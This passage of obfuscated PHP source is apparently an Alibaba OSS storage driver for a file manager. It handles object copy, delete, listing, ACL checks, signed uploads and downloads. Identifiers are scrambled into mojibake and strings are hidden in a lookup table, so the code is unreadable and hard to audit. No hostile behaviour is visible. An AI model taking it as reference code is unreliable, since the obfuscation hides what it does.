strlen($ö³¢‘Â«) - 1, 1) == $Œ´“¦•”[8] ? !0 : !1; if ($³”Ò´ßË) { continue; } $çÂºï[] = $Áºåş¼ä . $Œ´“¦•”[214] . $ö³¢‘Â«; } if ($¾ÀË¢ªå === $Œ´“¦•”[12]) { break; } } return array($Œ´“¦•”[85] => $»Ñ¤¢¡ä, $Œ´“¦•”[86] => $çÂºï); } public function copyFile($ã´¿‚é, $˜­Ğ„ãö) { $¹û—æûÚ = $this->size($ã´¿‚é); if ($¹û—æûÚ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $ã´¿‚é, $this->bucket, $this->pathEncode($˜­Ğ„ãö)); } catch (OSS\Core\OssException $×åÌ©Ñ) { $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][214] . $×åÌ©Ñ->getMessage()); return !1; } return $this->getPathOuter($˜­Ğ„ãö); } $º³é™ÁÚ = $this->multiCopyObject($ã´¿‚é, $˜­Ğ„ãö, $¹û—æûÚ); return $º³é™ÁÚ ? $this->getPathOuter($˜­Ğ„ãö) : !1; } private function multiCopyObject($š‡Œƒ†, $å©“›ï, $ÍÁ‰—®¤) { $ºîÜßıÎ =& $_SERVER[±Ö‰ô½¯]; try { $Ù¶ºà÷ƒ = array(); if ($å¼µ°ù = $this->hashMd5($š‡Œƒ†)) { $Ù¶ºà÷ƒ = array(OSS\OssClient::OSS_HEADERS => array($ºîÜßıÎ[1637] => $å¼µ°ù)); } $ÚËµ‡µ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($å©“›ï), $Ù¶ºà÷ƒ); $ªñ‹Õ¦Ì = 1; $¿ƒ°éŸ = 0; $’ú˜…ÙÖ = array(); $‚ëÏ¡ = 1024 * 1024 * 10; $’öìöÈš = $this->client->generateMultiuploadParts($ÍÁ‰—®¤, $‚ëÏ¡); foreach ($’öìöÈš as $Œ†É±¸Ÿ => $Ûü·—‚¸) { $ş½…í¨µ = $¿ƒ°éŸ + (int) $Ûü·—‚¸[$ºîÜßıÎ[1638]]; $›Òä€È = (int) $Ûü·—‚¸[$ºîÜßıÎ[414]] + $ş½…í¨µ - 1; $ê¯áÙ«× = array($ºîÜßıÎ[166] => $ş½…í¨µ, $ºîÜßıÎ[167] => $›Òä€È); $’ú˜…ÙÖ[] = $this->client->uploadPartCopy($this->bucket, $š‡Œƒ†, $this->bucket, $this->pathEncode($å©“›ï), $ªñ‹Õ¦Ì, $ÚËµ‡µ, $ê¯áÙ«×); $ªñ‹Õ¦Ì = $ªñ‹Õ¦Ì + 1; } $˜§İ¼›• = array(); foreach ($’ú˜…ÙÖ as $Œ†É±¸Ÿ => $Ï½‡†ñ) { $˜§İ¼›•[] = array($ºîÜßıÎ[299] => $Œ†É±¸Ÿ + 1, $ºîÜßıÎ[300] => $Ï½‡†ñ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($å©“›ï), $ÚËµ‡µ, $˜§İ¼›•); } catch (OSS\Core\OssException $Ä€©¼Ã) { $this->writeLog(__FUNCTION__ . $ºîÜßıÎ[214] . $Ä€©¼Ã->getMessage()); return !1; } return !0; } public function moveFile($…¾®Ü‘İ, $à‡è¸„ğ) { if ($this->copyFile($…¾®Ü‘İ, $à‡è¸„ğ)) { $this->remove($…¾®Ü‘İ); return $this->getPathOuter($à‡è¸„ğ); } return !1; } public function delFile($©’ä‡±Ì) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($©’ä‡±Ì)); } catch (OSS\Core\OssException $ƒ®…ÖŸ) { $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][214] . $ƒ®…ÖŸ->getMessage()); return !1; } return !0; } public function delFolder($ìŸêÇšğ) { $îËÜ» Ù =& $_SERVER[±Ö‰ô½¯]; if (!$this->exist($ìŸêÇšğ)) { return !0; } $this->listItemCache = !1; $²œµ¾ˆÓ = $this->fileList($ìŸêÇšğ); $this->listItemCache = !0; $€¤”©•… = trim($ìŸêÇšğ, $îËÜ» Ù[8]) . $îËÜ» Ù[8]; if (!empty($ìŸêÇšğ) && $ìŸêÇšğ !== $îËÜ» Ù[230] && !in_array($€¤”©•…, $²œµ¾ˆÓ[$îËÜ» Ù[85]])) { $²œµ¾ˆÓ[$îËÜ» Ù[85]][] = $€¤”©•…; } $ »‚åÌà = $this->delByBatch($²œµ¾ˆÓ[$îËÜ» Ù[86]]); if (!$ »‚åÌà) { return !1; } $ »‚åÌà = $this->delByBatch($²œµ¾ˆÓ[$îËÜ» Ù[85]]); if (!$ »‚åÌà) { return !1; } return $this->delFile($€¤”©•…); } private function delByBatch($¡¼öËÀæ) { foreach (array_chunk($¡¼öËÀæ, 1000) as $‹“óÍÚ) { try { $this->client->deleteObjects($this->bucket, $‹“óÍÚ); } catch (OSS\Core\OssException $‚š¨ÛÎ–) { $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][214] . $‚š¨ÛÎ–->getMessage()); return !1; } } return !0; } public function rename($Òğá—¯ì, $¶ä–¤ç) { return $this->renameObject($Òğá—¯ì, $¶ä–¤ç); } private function fileInfo($ÍÃ»íÏ, $ãÚ„í‚ø = false, $ãõŒ¹· = array()) { $Î½Îú© =& $_SERVER[±Ö‰ô½¯]; $ó¥»Ò“€ = array($Î½Îú©[32] => $this->pathThis($ÍÃ»íÏ), $Î½Îú©[87] => $this->getPathOuter($ÍÃ»íÏ), $Î½Îú©[33] => $Î½Îú©[232], $Î½Îú©[79] => isset($ãõŒ¹·[$Î½Îú©[79]]) ? $ãõŒ¹·[$Î½Îú©[79]] : 0, $Î½Îú©[168] => $this->ext($ÍÃ»íÏ)); if ($ãÚ„í‚ø) { return $ó¥»Ò“€; } $ó¥»Ò“€[$Î½Îú©[233]] = $ó¥»Ò“€[$Î½Îú©[88]] = 0; $ó¥»Ò“€[$Î½Îú©[234]] = $ó¥»Ò“€[$Î½Îú©[235]] = !0; if (empty($ãõŒ¹·)) { $¢Ãà„±ê = $this->objectMeta($ÍÃ»íÏ); if (!$¢Ãà„±ê) { return $ó¥»Ò“€; } $ãõŒ¹· = array($Î½Îú©[88] => strtotime($¢Ãà„±ê[$Î½Îú©[1636]]), $Î½Îú©[79] => $¢Ãà„±ê[$Î½Îú©[1635]] + 0, $Î½Îú©[1634] => $¢Ãà„±ê[$Î½Îú©[1634]]); } if (isset($ãõŒ¹·[$Î½Îú©[1634]]) && $ãõŒ¹·[$Î½Îú©[1634]]) { $ó¥»Ò“€[$Î½Îú©[237]] = trim($ãõŒ¹·[$Î½Îú©[1634]], $Î½Îú©[119]); } if (isset($ãõŒ¹·[$Î½Îú©[79]])) { $ó¥»Ò“€[$Î½Îú©[79]] = $ãõŒ¹·[$Î½Îú©[79]]; } if (isset($ãõŒ¹·[$Î½Îú©[88]])) { $ó¥»Ò“€[$Î½Îú©[88]] = $ãõŒ¹·[$Î½Îú©[88]]; } if (isset($ãõŒ¹·[$Î½Îú©[206]]) && !trim($ó¥»Ò“€[$Î½Îú©[88]])) { $ó¥»Ò“€[$Î½Îú©[88]] = $ãõŒ¹·[$Î½Îú©[206]]; } return $ó¥»Ò“€; } private function folderInfo($Ñ²ë²¬±, $”¤Ô±Å† = false, $ïö¬É‹ = array()) { $İÏÔå =& $_SERVER[±Ö‰ô½¯]; $ªİ¹’²á = array($İÏÔå[32] => $this->pathThis($Ñ²ë²¬±), $İÏÔå[87] => $this->getPathOuter($İÏÔå[8] . $Ñ²ë²¬±), $İÏÔå[33] => $İÏÔå[78]); if ($”¤Ô±Å†) { return $ªİ¹’²á; } $ªİ¹’²á[$İÏÔå[233]] = $ªİ¹’²á[$İÏÔå[88]] = 0; $ªİ¹’²á[$İÏÔå[234]] = $ªİ¹’²á[$İÏÔå[235]] = !0; if (empty($ïö¬É‹)) { $Ñ²ë²¬± = rtrim($Ñ²ë²¬±, $İÏÔå[8]) . $İÏÔå[8]; $È·ÛÛÜ‡ = $this->objectMeta($Ñ²ë²¬±); if (!$È·ÛÛÜ‡) { return $ªİ¹’²á; } $ïö¬É‹ = array($İÏÔå[233] => $È·ÛÛÜ‡[$İÏÔå[592]][$İÏÔå[1639]], $İÏÔå[88] => strtotime($È·ÛÛÜ‡[$İÏÔå[1636]])); } if (isset($ïö¬É‹[$İÏÔå[88]])) { $ªİ¹’²á[$İÏÔå[88]] = $ïö¬É‹[$İÏÔå[88]]; } if (isset($ïö¬É‹[$İÏÔå[233]])) { $ªİ¹’²á[$İÏÔå[233]] = $ïö¬É‹[$İÏÔå[233]]; } return $ªİ¹’²á; } public function listPath($ãş¡šéË, $‚Ë®ª¸ü = false) { $ø£Ìóôí =& $_SERVER[±Ö‰ô½¯]; $÷ú š‡Ä = $this->fileList($ãş¡šéË, $ø£Ìóôí[8], !0); foreach ($÷ú š‡Ä[$ø£Ìóôí[85]] as $ÜÉƒ¶ÊÏ => $ü…ñĞ…õ) { $÷ú š‡Ä[$ø£Ìóôí[85]][$ÜÉƒ¶ÊÏ] = $this->folderInfo($ü…ñĞ…õ, $‚Ë®ª¸ü, $ü…ñĞ…õ); } foreach ($÷ú š‡Ä[$ø£Ìóôí[86]] as $ÜÉƒ¶ÊÏ => $ü…ñĞ…õ) { $÷ú š‡Ä[$ø£Ìóôí[86]][$ÜÉƒ¶ÊÏ] = $this->fileInfo($ü…ñĞ…õ[$ø£Ìóôí[32]], $‚Ë®ª¸ü, $ü…ñĞ…õ); } return $÷ú š‡Ä; } protected function infoChildren($Õ„ôúõè, &$è‚áßŠş) { $“È Äñ =& $_SERVER[±Ö‰ô½¯]; $¸ßÂ±Ç‚ = $this->fileList($Õ„ôúõè, $“È Äñ[12], !0); $è‚áßŠş[$“È Äñ[81]] += count($¸ßÂ±Ç‚[$“È Äñ[85]]); $è‚áßŠş[$“È Äñ[80]] += count($¸ßÂ±Ç‚[$“È Äñ[86]]); foreach ($¸ßÂ±Ç‚[$“È Äñ[86]] as $¼¹ìçìù) { if (!$¼¹ìçìù || !$¼¹ìçìù[$“È Äñ[79]]) { continue; } $è‚áßŠş[$“È Äñ[79]] += $¼¹ìçìù[$“È Äñ[79]]; } } public function has($ñºäæèÜ, $«ŒëÍÑœ = false, $àÓÀ¨ßÆ = true) { $ï”†‘ò§ =& $_SERVER[±Ö‰ô½¯]; $ñºäæèÜ = trim($ñºäæèÜ, $ï”†‘ò§[8]); $Ÿ†´åÁŒ = empty($ñºäæèÜ) && $ñºäæèÜ !== $ï”†‘ò§[230] ? $ï”†‘ò§[12] : $ñºäæèÜ . $ï”†‘ò§[8]; $ˆ‚…Ì­İ = $ï”†‘ò§[12]; $·‡ºåõ™ = 500; $àíÁÔö = $·êÌŞ·¾ = 0; while (!0) { check_abort(); $½ùâ¦÷ë = array($ï”†‘ò§[1630] => $ï”†‘ò§[8], $ï”†‘ò§[1631] => $Ÿ†´åÁŒ, $ï”†‘ò§[1632] => $·‡ºåõ™, $ï”†‘ò§[1633] => $ˆ‚…Ì­İ); try { $íªá÷Íê = $this->client->listObjects($this->bucket, $½ùâ¦÷ë); } catch (OSS\Core\OssException $™ªæ™‰) { $this->writeLog(__FUNCTION__ . $ï”†‘ò§[214] . $™ªæ™‰->getMessage()); break; } $ˆ‚…Ì­İ = $íªá÷Íê->getNextMarker(); $ÅÃ”õß„ = $íªá÷Íê->getObjectList(); $ÇƒÌœ¾ã = $íªá÷Íê->getPrefixList(); if ($«ŒëÍÑœ) { if (count($ÅÃ”õß„) > 1 || count($ÅÃ”õß„) == 1 && $ÅÃ”õß„[0]->getKey() != $Ÿ†´åÁŒ) { $àíÁÔö += count($ÅÃ”õß„) - 1; } if (!empty($ÇƒÌœ¾ã)) { $·êÌŞ·¾ += count($ÇƒÌœ¾ã); } if ($ˆ‚…Ì­İ === $ï”†‘ò§[12]) { break; } continue; } if ($àÓÀ¨ßÆ) { if (!empty($ÅÃ”õß„)) { if (count($ÅÃ”õß„) > 1 || $ÅÃ”õß„[0]->getKey() != $Ÿ†´åÁŒ) { return !0; } } } else { if (!empty($ÇƒÌœ¾ã)) { return !0; } } if ($ˆ‚…Ì­İ === $ï”†‘ò§[12]) { break; } } if ($«ŒëÍÑœ) { return array($ï”†‘ò§[241] => $àíÁÔö, $ï”†‘ò§[242] => $·êÌŞ·¾); } return !1; } public function listAll($ãûŸºœ¬) { $ÛĞø×ù– =& $_SERVER[±Ö‰ô½¯]; $Äø“õ©÷ = $this->fileList($ãûŸºœ¬, $ÛĞø×ù–[12], !0); $ş×™÷˜ = array_to_keyvalue($Äø“õ©÷[$ÛĞø×ù–[86]], $ÛĞø×ù–[32]); foreach ($Äø“õ©÷[$ÛĞø×ù–[85]] as $„Å´ş­) { if (is_string($„Å´ş­)) { $ş×™÷˜[$„Å´ş­] = array($ÛĞø×ù–[79] => 0); } } return $this->listAllFiles($ãûŸºœ¬, $ş×™÷˜); } public function canRead($“¶²„µÛ) { $·Ï˜•ºÃ =& $_SERVER[±Ö‰ô½¯]; $íĞ¾ÉŸ‹ = $this->pathAcl($“¶²„µÛ); return $íĞ¾ÉŸ‹ == $·Ï˜•ºÃ[1640] || $íĞ¾ÉŸ‹ == $·Ï˜•ºÃ[639] ? !0 : !1; } public function canWrite($Ş™£®ï·) { $„¹ˆ´Ûş = $this->pathAcl($Ş™£®ï·); return $„¹ˆ´Ûş == $_SERVER[±Ö‰ô½¯][639] ? !0 : !1; } public function pathAcl($ÇûÔ¤Ğß) { $âìÚ£Éè =& $_SERVER[±Ö‰ô½¯]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $şê¢“šÏ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ÇûÔ¤Ğß)); } catch (OSS\Core\OssException $´ÒÄ÷Í°) { $this->writeLog(__FUNCTION__ . $âìÚ£Éè[214] . $´ÒÄ÷Í°->getMessage()); return !1; } $…Îåïù¥ = $şê¢“šÏ == $âìÚ£Éè[37] ? $this->bucketAcl : $şê¢“šÏ; if ($…Îåïù¥ == $âìÚ£Éè[1641]) { return $âìÚ£Éè[1640]; } if ($…Îåïù¥ == $âìÚ£Éè[1642]) { return $âìÚ£Éè[639]; } return $…Îåïù¥; } private function chmodPath($Ñƒâ, $¥°ÔğöË = '') { $Ì¨œ¼¾± =& $_SERVER[±Ö‰ô½¯]; $ù‹å¢ÎŞ = empty($¥°ÔğöË) ? $Ì¨œ¼¾±[1642] : $¥°ÔğöË; $ã™¿‰… = array($Ì¨œ¼¾±[37], $Ì¨œ¼¾±[231], $Ì¨œ¼¾±[1641], $Ì¨œ¼¾±[1642]); if (!in_array($ù‹å¢ÎŞ, $ã™¿‰…)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Ñƒâ), $ù‹å¢ÎŞ); } catch (OSS\Core\OssException $ïòø Ï¼) { $this->writeLog(__FUNCTION__ . $Ì¨œ¼¾±[214] . $ïòø Ï¼->getMessage()); return !1; } return !0; } public function getContent($“–ş¨Íä) { return $this->fileSubstr($“–ş¨Íä, -1); } public function setContent($ä·úµÕà, $¡«úÅ½« = '') { $”¦à½»© =& $_SERVER[±Ö‰ô½¯]; try { $¢­öÁ•è = $this->trafficLimit($”¦à½»©[1643]); $ŠÁ÷¹åø = $this->client->putObject($this->bucket, $this->pathEncode($ä·úµÕà), $¡«úÅ½«, $¢­öÁ•è); } catch (OSS\Core\OssException $Ê›»»—´) { $this->writeLog(__FUNCTION__ . $”¦à½»©[214] . $Ê›»»—´->getMessage()); return !1; } $©²«ä® = array($”¦à½»©[1637] => trim($ŠÁ÷¹åø[$”¦à½»©[1634]], $”¦à½»©[119]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ä·úµÕà))); $this->updateObjMeta($ä·úµÕà, $©²«ä®); return isset($ŠÁ÷¹åø[$”¦à½»©[1644]][$”¦à½»©[296]]) ? !0 : !1; } private function updateObjMeta($’ÎĞåó, $Î€Ğ­´†) { $’ÎĞåó = $this->pathEncode($’ÎĞåó); try { $ç‡£Å©” = array(OSS\OssClient::OSS_HEADERS => $Î€Ğ­´†); $this->client->copyObject($this->bucket, $’ÎĞåó, $this->bucket, $’ÎĞåó, $ç‡£Å©”); } catch (OSS\Core\OssException $™ŸÊ´íŠ) { $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][214] . $™ŸÊ´íŠ->getMessage()); return !1; } return !0; } public function upload($‹¼Ëàåï, $šÙÓ€Ú¬, $”Ì…îíã = false, $Œìû›Ò = REPEAT_REPLACE) { $Ï¼œ„Å… =& $_SERVER[±Ö‰ô½¯]; if (!$šÙÓ€Ú¬ || !@file_exists($šÙÓ€Ú¬)) { return !1; } $éª™ÚŠÊ = trim($‹¼Ëàåï, $Ï¼œ„Å…[8]); $”êªƒ±Ã = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Ï¼œ„Å…[1637] => @md5_file($šÙÓ€Ú¬)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‹¼Ëàåï))); $”êªƒ±Ã = $this->trafficLimit($Ï¼œ„Å…[1643], $”êªƒ±Ã); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($éª™ÚŠÊ), $šÙÓ€Ú¬, $”êªƒ±Ã); } catch (OSS\Core\OssException $ã§É¢Ş») { $this->writeLog(__FUNCTION__ . $Ï¼œ„Å…[214] . $ã§É¢Ş»->getMessage()); return !1; } return $this->getPathOuter($‹¼Ëàåï); } public function getHost() { $ëøó€ =& $_SERVER[±Ö‰ô½¯]; $©ô¾ã˜Ğ = explode($ëøó€[210], parent::getHost()); return $©ô¾ã˜Ğ[0] . $ëøó€[210] . $this->bucket . $ëøó€[10] . $©ô¾ã˜Ğ[1]; } public function uploadFormData($´„™Ùâ†, $ÍÁ”ÊŸÇ = 3600) { $ÃØ×ñ¥  =& $_SERVER[±Ö‰ô½¯]; if (!($¼è¶°Åø = $this->getHost())) { return !1; } $áÀªÚ‰À = $ÍÁ”ÊŸÇ; $ÑÛƒ¸‰ø = date($ÃØ×ñ¥ [1645], time() + $áÀªÚ‰À); $ª Õ‚àÁ = new DateTime($ÑÛƒ¸‰ø); $°ôÈŠß = $ª Õ‚àÁ->format(DateTime::ISO8601); $¸²®Ñ¼Ü = strpos($°ôÈŠß, $ÃØ×ñ¥ [373]); $°ôÈŠß = substr($°ôÈŠß, 0, $¸²®Ñ¼Ü) . $ÃØ×ñ¥ [1646]; $¦ñá‘ª = 1048576000 * 5; $‚‹œÑ œ = $this->pathFather($´„™Ùâ†); $¿Ó’“å· = array($ÃØ×ñ¥ [264] => $°ôÈŠß, $ÃØ×ñ¥ [267] => array(array($ÃØ×ñ¥ [1647], 0, $¦ñá‘ª), array($ÃØ×ñ¥ [269], $ÃØ×ñ¥ [270], $‚‹œÑ œ))); $™Æ–ŠŠ = base64_encode(json_encode($¿Ó’“å·)); $ü‹ƒæÑŞ = base64_encode(hash_hmac($ÃØ×ñ¥ [1473], $™Æ–ŠŠ, $this->secret, !0)); $ÌôàøŠ = array($ÃØ×ñ¥ [1648] => $this->accessKey, $ÃØ×ñ¥ [279] => $™Æ–ŠŠ, $ÃØ×ñ¥ [272] => $ÃØ×ñ¥ [263], $ÃØ×ñ¥ [1649] => $ü‹ƒæÑŞ, $ÃØ×ñ¥ [208] => $¼è¶°Åø); $ÌôàøŠ = $this->trafficLimit($ÃØ×ñ¥ [1643], $ÌôàøŠ, !0); return $ÌôàøŠ; } public function uploadMultiData($»¨ï“çí, $êúäÓ † = 3600) { $şŠÏÁÆó =& $_SERVER[±Ö‰ô½¯]; if (!($êñ´Ì÷ = $this->getHost())) { return !1; } $†Ô´ã†Ç = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($»¨ï“çí)); return array($şŠÏÁÆó[283] => $†Ô´ã†Ç, $şŠÏÁÆó[208] => $êñ´Ì÷ . $şŠÏÁÆó[8] . $this->pathEncode($»¨ï“çí), $şŠÏÁÆó[284] => gmdate($şŠÏÁÆó[1650]), $şŠÏÁÆó[95] => $»¨ï“çí); } public function uploadMultiAuth($œš¶ÅöÁ, $æÍÙ ‹ß = array()) { if (isset($æÍÙ ‹ß[$_SERVER[±Ö‰ô½¯][285]])) { return $this->uploadPartAuth($œš¶ÅöÁ, $æÍÙ ‹ß); } return $this->uploadListAuth($œš¶ÅöÁ, $æÍÙ ‹ß); } private function uploadPartAuth($ ãÍÄƒ, $º†Ìô»à = array()) { $ŒØá­ =& $_SERVER[±Ö‰ô½¯]; $áşªí¥¼ = $º†Ìô»à[$ŒØá­[95]]; $ÌÅÄÈ¼ë = $this->_getUploadAuth($áşªí¥¼, $º†Ìô»à); $ı•ØÉ¿ã = array($ŒØá­[288] => $ÌÅÄÈ¼ë[$ŒØá­[288]], $ŒØá­[284] => $ÌÅÄÈ¼ë[$ŒØá­[284]]); if (isset($ÌÅÄÈ¼ë[$ŒØá­[1651]])) { $ı•ØÉ¿ã[$ŒØá­[1651]] = $ÌÅÄÈ¼ë[$ŒØá­[1651]]; } return $ı•ØÉ¿ã; } private function uploadListAuth($è‚•‰Ö, $íÈ×Ÿá€ = array()) { $æÛæğŞ³ =& $_SERVER[±Ö‰ô½¯]; $É€Ú„ç„ = $íÈ×Ÿá€[$æÛæğŞ³[95]]; $Õ³™ãü˜ = $íÈ×Ÿá€[$æÛæğŞ³[283]]; $çÕ¿·’  = $this->client->listParts($this->bucket, $this->pathEncode($É€Ú„ç„), $Õ³™ãü˜); $½—Ìáêµ = $çÕ¿·’ ->getListPart(); $¾ÑùÁÜ = array(); foreach ($½—Ìáêµ as $ÓÖ•£­) { $¾ÑùÁÜ[] = array($æÛæğŞ³[299] => $ÓÖ•£­->getPartNumber(), $æÛæğŞ³[300] => trim($ÓÖ•£­->getETag(), $æÛæğŞ³[119])); } if (!$¾ÑùÁÜ) { return !1; } $³’º¤ÛŞ = $this->_getUploadAuth($É€Ú„ç„, $íÈ×Ÿá€); return array($æÛæğŞ³[288] => $³’º¤ÛŞ[$æÛæğŞ³[288]], $æÛæğŞ³[284] => $³’º¤ÛŞ[$æÛæğŞ³[284]], $æÛæğŞ³[291] => $¾ÑùÁÜ); } private function _getUploadAuth($ÛŠú‰Ò, $¡¡óã¿‘) { $öÍÀßø =& $_SERVER[±Ö‰ô½¯]; $Ş¶¥¤ = gmdate($öÍÀßø[1650]); $„Ü’§•§ = isset($¡¡óã¿‘[$öÍÀßø[285]]) ? $öÍÀßø[255] : $öÍÀßø[290]; $ÅÄãÂ’ = array_intersect_key($¡¡óã¿‘, array_flip(array($öÍÀßø[285], $öÍÀßø[283]))); ksort($ÅÄãÂ’); $İƒÎ¡ó× = $ÅÄãÂ’ ? $öÍÀßø[76] . http_build_query($ÅÄãÂ’, null, $öÍÀßø[286], PHP_QUERY_RFC3986) : $öÍÀßø[12]; $ŠÉĞÄ«º = array($„Ü’§•§, $öÍÀßø[12], $öÍÀßø[121], $Ş¶¥¤, "\x78\55\157\163\163\x2d\x64\x61\164\145\x3a{$Ş¶¥¤}", $öÍÀßø[8] . $this->bucket . $öÍÀßø[8] . $ÛŠú‰Ò . $İƒÎ¡ó×); if (isset($¡¡óã¿‘[$öÍÀßø[285]])) { $ÔÛÁ©§ = $this->trafficLimit($öÍÀßø[1643], array(), !0); if ($ÔÛÁ©§) { $ÛŠú‰Ò = $öÍÀßø[1651]; array_splice($ŠÉĞÄ«º, 5, 0, $ÛŠú‰Ò . $öÍÀßø[4] . $ÔÛÁ©§[$ÛŠú‰Ò]); } } $åºäÈ– = implode($öÍÀßø[287], $ŠÉĞÄ«º); $øğû–©— = base64_encode(hash_hmac($öÍÀßø[1473], $åºäÈ–, $this->secret, !0)); $÷Ãîã ô = $öÍÀßø[1620] . $this->accessKey . $öÍÀßø[4] . $øğû–©—; $—¼£³Å‡ = array($öÍÀßø[288] => $÷Ãîã ô, $öÍÀßø[284] => $Ş¶¥¤); if (!empty($ÔÛÁ©§)) { $—¼£³Å‡ = array_merge($—¼£³Å‡, $ÔÛÁ©§); } return $—¼£³Å‡; } public function download($Ë¦õ‰à, $Âèçñá¼) { $“ºóá×¬ =& $_SERVER[±Ö‰ô½¯]; if ($this->isFolder($Ë¦õ‰à)) { return !1; } try { $‰©ÊÑë´ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Âèçñá¼); $‰©ÊÑë´ = $this->trafficLimit($“ºóá×¬[110], $‰©ÊÑë´); $this->client->getObject($this->bucket, $this->pathEncode($Ë¦õ‰à), $‰©ÊÑë´); } catch (OSS\Core\OssException $”ß»Î‹¯) { $this->writeLog(__FUNCTION__ . $“ºóá×¬[214] . $”ß»Î‹¯->getMessage()); return !1; } return $Âèçñá¼; } public function fileSubstr($Ã¤°®Ü, $Ó©÷œõá = 0, $Ñî±¨¶ = false) { if ($Ó©÷œõá === -1) { $ä­ıø¶ê = array(); } else { if ($Ñî±¨¶ === !1) { $Ş„Óâ‘ = $this->size($Ã¤°®Ü); } else { $Ş„Óâ‘ = $Ó©÷œõá + $Ñî±¨¶ - 1; } $ä­ıø¶ê = array(OSS\OssClient::OSS_RANGE => "{$Ó©÷œõá}\55{$Ş„Óâ‘}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Ã¤°®Ü), $ä­ıø¶ê); } catch (OSS\Core\OssException $¯€€ã„é) { $this->writeLog(__FUNCTION__ . $_SERVER[±Ö‰ô½¯][214] . $¯€€ã„é->getMessage()); think_exception($¯€€ã„é->getMessage()); return !1; } } private function trafficLimit($Ü¨±½ìÕ, $Ë«åãÄ¹ = array(), $³ğÒ×™ø = false) { $¼ÎŸŠ“æ =& $_SERVER[±Ö‰ô½¯]; if ($Ü¨±½ìÕ == $¼ÎŸŠ“æ[1643] && $this->isUploadServer() || $Ü¨±½ìÕ == $¼ÎŸŠ“æ[110] && $this->isFileOutServer()) { return $Ë«åãÄ¹; } $´‡ÓûÌ™ = floatval($GLOBALS[$¼ÎŸŠ“æ[6]][$¼ÎŸŠ“æ[92]][$¼ÎŸŠ“æ[108]][$Ü¨±½ìÕ]) * 1024 * 1024 * 8; if (!$´‡ÓûÌ™) { return $Ë«åãÄ¹; } $´‡ÓûÌ™ = $´‡ÓûÌ™ < 819200 ? 819200 : ($´‡ÓûÌ™ > 838860800 ? 838860800 : $´‡ÓûÌ™); if ($³ğÒ×™ø) { $Ë«åãÄ¹[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($´‡ÓûÌ™); } else { if (!isset($Ë«åãÄ¹[OSS\OssClient::OSS_HEADERS])) { $Ë«åãÄ¹[OSS\OssClient::OSS_HEADERS] = array(); } $Ë«åãÄ¹[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($´‡ÓûÌ™); } return $Ë«åãÄ¹; } public function link($Ä–ï «“, $Ñ†¥¥×œ = array()) { $¡¾›˜‡İ =& $_SERVER[±Ö‰ô½¯]; if (!$this->exist($Ä–ï «“) || $this->isFolder($Ä–ï «“)) { return !1; } try { $Ñ†¥¥×œ = $this->trafficLimit($¡¾›˜‡İ[110], $Ñ†¥¥×œ, !0); $¾ÅÅì¸ = $this->client->signUrl($this->bucket, $this->pathEncode($Ä–ï «“), 3600 * 12, $¡¾›˜‡İ[1555], $Ñ†¥¥×œ); return $this->getCdnLink($¾ÅÅì¸); } catch (OSS\Core\OssException $ı´¼ÂÂ) { $this->writeLog(__FUNCTION__ . $¡¾›˜‡İ[214] . $ı´¼ÂÂ->getMessage()); return !1; } } public function fileOut($ÍÏå°Á, $Ü­Á†Ô = false, $òˆÅú¬Ï = false, $€ÉÛŞÜ± = '') { $ğ­ª›üâ =& $_SERVER[±Ö‰ô½¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÍÏå°Á, $Ü­Á†Ô, $òˆÅú¬Ï, $€ÉÛŞÜ±); } if (!$òˆÅú¬Ï) { $òˆÅú¬Ï = $this->pathThis($ÍÏå°Á); } $òˆÅú¬Ï = rawurlencode($òˆÅú¬Ï); $İ°²Ê‘ = get_file_mime(get_path_ext($òˆÅú¬Ï)); if ($İ°²Ê‘ == $ğ­ª›üâ[250]) { return parent::fileOut($ÍÏå°Á, $Ü­Á†Ô, $òˆÅú¬Ï, $€ÉÛŞÜ±); } $Ü­Á†Ô = $Ü­Á†Ô ? $ğ­ª›üâ[1652] : $ğ­ª›üâ[1653]; $ÂÆ—æŠ = array(OSS\OssClient::OSS_SUB_RESOURCE => $ğ­ª›üâ[1654] . rawurlencode("{$Ü­Á†Ô}\73\x66\x69\154\145\x6e\141\x6d\145\75{$òˆÅú¬Ï}")); $–‰½ã = $this->link($ÍÏå°Á, $ÂÆ—æŠ); $this->fileOutLink($–‰½ã); } public function fileOutServer($ı½çĞŠÅ, $ß‰¤ò×­ = false, $ˆåã³ª… = false, $€úâ‘˜ = '') { parent::fileOut($ı½çĞŠÅ, $ß‰¤ò×­, $ˆåã³ª…, $€úâ‘˜); } public function fileOutImage($ÙÆ¡ÉÈñ, $ôîÖ²Ú = 250) { if ($this->size($ÙÆ¡ÉÈñ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ÙÆ¡ÉÈñ, $ôîÖ²Ú); } $ßÏ†„±Ş = array(OSS\OssClient::OSS_PROCESS => $_SERVER[±Ö‰ô½¯][1617] . $ôîÖ²Ú); $†¶ãåÚÜ = $this->link($ÙÆ¡ÉÈñ, $ßÏ†„±Ş); $this->fileOutLink($†¶ãåÚÜ); } public function fileOutImageServer($óÂİÌãÎ, $Å—Äûãã = 250) { parent::fileOutImage($óÂİÌãÎ, $Å—Äûãã); } public function fileOutLink($ÊşĞš‡ì) { $‹ËæÒéÊ =& $_SERVER[±Ö‰ô½¯]; if 